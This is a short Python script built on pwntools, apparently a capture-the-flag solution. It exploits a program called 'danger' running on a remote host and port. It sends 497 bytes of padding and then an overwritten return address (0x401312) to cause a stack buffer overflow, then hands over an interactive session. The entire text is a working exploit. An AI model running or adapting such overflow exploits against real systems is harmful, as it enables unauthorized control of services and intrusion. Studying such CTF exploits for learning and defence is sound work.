from pwn import * 

HOST = 'jh2i.com'
PORT = 50011

#r = process('./danger')
r = remote(HOST,PORT)
pad = 'A'*497
addr = p64(0x00401312)
r.sendline(pad.encode()+addr)
r.interactive()
